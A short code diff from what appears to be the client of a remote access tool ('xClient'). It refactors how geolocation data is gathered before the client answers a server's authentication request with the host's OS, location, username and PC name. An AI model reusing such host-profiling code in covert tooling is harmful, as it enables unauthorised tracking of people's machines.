@@ -15,9 +15,9 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetAuthentication(Packets.ServerPackets.GetAuthentication command, Client client)
         {
-            SystemCore.InitializeGeoIp();
+            GeoLocationHelper.Initialize();
             new Packets.ClientPackets.GetAuthenticationResponse(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
-                SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex,
+                GeoLocationHelper.Country, GeoLocationHelper.CountryCode, GeoLocationHelper.Region, GeoLocationHelper.City, GeoLocationHelper.ImageIndex,
                 SystemCore.GetId(), SystemCore.GetUsername(), SystemCore.GetPcName()).Execute(client);
         }
 
